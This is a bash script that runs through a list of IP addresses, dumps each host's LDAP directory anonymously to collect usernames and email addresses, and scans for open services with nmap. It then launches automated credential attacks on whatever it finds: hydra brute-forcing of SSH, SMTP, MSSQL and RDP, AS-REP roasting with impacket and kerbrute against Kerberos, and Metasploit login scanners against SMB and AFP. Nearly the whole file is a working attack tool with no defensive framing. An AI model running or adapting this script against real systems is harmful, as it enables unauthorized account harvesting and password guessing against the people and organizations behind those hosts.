#!/bin/bash
for line in $(cat iplist)
do

#Get DN

DN=$(timeout 3 python3 getdn.py $line 2> /dev/null | grep "dc=" | head -n 1 | cut -d " " -f 5 )

#If no DN skip
if [[ ! -z "$DN" ]];then
echo "=============== [Info] ==============="
echo $line
echo $DN

#from DN to URL
urltmp=${DN//dc=/}
url=${urltmp//,/.}
echo $url

#Full dump
dump=$(timeout 3 ldapsearch -LLL -x -H ldap://$line -b "$DN" 2> /dev/null)


#Grab Users via uid
echo "=========== [Users via uid] ==========="
users=$(echo "$dump" | grep  "\<uid: " | cut -d " " -f 2)
nbusers=$(echo "$users" | wc -l )
echo "$nbusers Users"
echo "$users" | head -n 10 
if [ "$nbusers" -gt 10 ]; then 
echo "..."
fi
echo "$users" > userlist



#Grab Users via dn: uid
users=$(echo "$dump"  | grep "dn: uid=" | cut -d " " -f 2 | cut -d "," -f 1 | cut -d "=" -f 2)
echo "=========== [Users via dn] ==========="
nbusers=$(echo "$users" | wc -l )
echo "$nbusers Users"
echo "$users" | head -n 10 
if [ "$nbusers" -gt 10 ]; then 
echo "..."
fi
echo "$users" >> userlist

#Grab Users via member: cn

users=$(echo "$dump"  | grep "member: cn=" | cut -d " " -f 2 | cut -d "," -f 1 | cut -d "=" -f 2)
echo "========= [Users via member] ========="
nbusers=$(echo "$users" | wc -l )
echo "$nbusers Users"
echo "$users" | head -n 10
if [ "$nbusers" -gt 10 ]; then 
echo "..."
fi
echo "$users" >> userlist


#Grab Users via memberUid:

users=$(echo "$dump"  | grep "memberUid" | cut -d " " -f 2)
echo "======= [Users via memberUid] ========"
nbusers=$(echo "$users" | wc -l )
echo "$nbusers Users"
echo "$users" | head -n 10 
if [ "$nbusers" -gt 10 ]; then 
echo "..."
fi
echo "$users" >> userlist


#Grab Users via mail:

users=$(echo "$dump"  | grep "mail" | cut -d " " -f 2  | cut -d "@" -f 1)
echo "========= [Users via mail] =========="
nbusers=$(echo "$users" | wc -l )
echo "$nbusers Users"
echo "$users" | head -n 10 
if [ "$nbusers" -gt 10 ]; then 
echo "..."
fi
echo "$users" >> userlist

#Grab  mail:

mails=$(echo "$dump"  | grep "mail" | cut -d " " -f 2  )
nbmails=$(echo "$mails" | wc -l )
echo "============== [Mail] ==============="
echo "$nbmails Mails"
echo "$mails" | head -n 10 
if [ "$nbmails" -gt 10 ]; then 
echo "..."
fi
echo "$mails" >> mails

#remove users duplicates

sort userlist | uniq -i > users
echo "=========== [Unique users] ==========="
users=$(cat users)
nbusers=$(echo "$users" | wc -l )
echo "$nbusers Users"
echo "$users" | head -n 10 
if [ "$nbusers" -gt 10 ]; then 
echo "..."
fi



#Scan services if users found

if [[ ! -z "$users" ]];then
echo "=========== [Scan Services] ==========="
scan_res=$(nmap $line -p 22,25,88,389,445,548,1433,3389)

ssh_svc=$(echo "$scan_res" | grep "22/tcp   open ")
smtp_svc=$(echo "$scan_res" | grep "25/tcp   open")
kerb_svc=$(echo "$scan_res" | grep "88/tcp   open")
#ldap_svc=$(echo "$scan_res" | grep "389/tcp  open")
smb_svc=$(echo "$scan_res" | grep "445/tcp  open")
afp_svc=$(echo "$scan_res" | grep "548/tcp  open")
mssql_svc=$(echo "$scan_res" | grep "1433/tcp open")
rdp_svc=$(echo "$scan_res" | grep "3389/tcp open")


#Bruteforce Services if found


#if [[ ! -z "$ldap_svc" ]];then
#echo "===> LDAP Open : Enum With Hydra Ldap_bruteforce (broken)"
#bash create_user_password_list.sh $line > userpass
#hydra -C userpass $line -m $DN ldap2 
#echo "===> LDAP Closed"
#fi

#SSH

if [[ ! -z "$ssh_svc" ]];then
echo "===> SSH Open : BF With hydra ssh"
echo "$(echo "$users" | wc -l ) Users"
if [ "$nbusers" -lt 80 ]; then 
echo "===> SSH Open : Few Users , Let's go"
bash create_user_password_list.sh > userpass
hydra -C userpass -I -t 4 -V $line ssh
else
echo "===> SSH Open : Lot of users, are you sure (yes/no)"
read -t 5 sshbrute
if [ "$sshbrute" == "yes" ];then
bash create_user_password_list.sh > userpass
hydra -C userpass -I -t 4 -V $line ssh
else
echo "===> SSH Bruteforce Aborted"
fi
fi
else 
echo "===> SSH Closed"
fi


if [[ ! -z "$smtp_svc" ]];then
if [[ ! -z "$mails" ]];then
echo "===> SMTP Open and mails dumped : Enum with hydra smtp "
bash create_mail_password_list.sh > mailpass
hydra -C mailpass $line smtp -V
else 
echo "===> SMTP Open But no mails "
fi
else
echo "===> SMTP Closed"
fi



if [[ ! -z "$kerb_svc" ]];then
echo "===> Kerberos Open : Impacket GetNPUsers "
impacket-GetNPUsers -dc-ip $line $url/ -usersfile users
echo "===> Kerberos Open : Kerbrute "
bash create_user_password_list.sh > userpass
validuserpasskerbrute=$(/root/go/bin/kerbrute -d $url bruteforce userpass | grep "VALID LOGIN" | cut -d " " -f 8)
echo "$validuserpasskerbrute"
echo "$valid_user_pass_kerbrute" > valid_user_pass_kerbrute
else 
echo "===> Kerberos Closed"
fi


if [[ ! -z "$smb_svc" ]];then
echo "===> SMB Open : BF With MSF MODULE SMB_Login (CTRL+C to skip)"
msfconsole -q -x "use auxiliary/scanner/smb/smb_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1; set SMBDOMAIN $url; set THREADS 10; exploit; exit;"
else 
echo "===> SMB Closed"
fi


if [[ ! -z "$afp_svc" ]];then
echo "===> AFP Open : BF With MSF MODULE AFP_Login"
msfconsole -q -x "use auxiliary/scanner/afp/afp_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1;set THREADS 10; exploit; exit;"
else 
echo "===> AFP Closed"
fi


if [[ ! -z "$mssql_svc" ]];then
echo "===> MSSQL Open : BF With Hydra MSSQL"
bash create_user_password_list.sh > userpass
hydra -C userpass $line mssql
else 
echo "===> MSSQL Closed"
fi


if [[ ! -z "$rdp_svc" ]];then
echo "===> RDP Open : BF With Hydra RDP"
bash create_user_password_list.sh > userpass
hydra -t 1 -V -f -C userpass rdp://$line
else 
echo "===> RDP Closed"
fi


#Fast scan if no services found
if [[ -z "$ssh_svc" && -z "$smtp_svc" && -z "$kerb_svc" && -z "$smb_svc" && -z "$afp_svc" && -z "$mssql_svc" && -z "$rdp_svc" ]]; then
echo "============= [Fast Scan] ============="
nmap $line  -F| grep open
fi

else 


#Full dump if no users found
echo "============= [Full Dump] ============="
echo "$dump" 

fi




echo "======================================="
echo ""
echo ""
fi

done
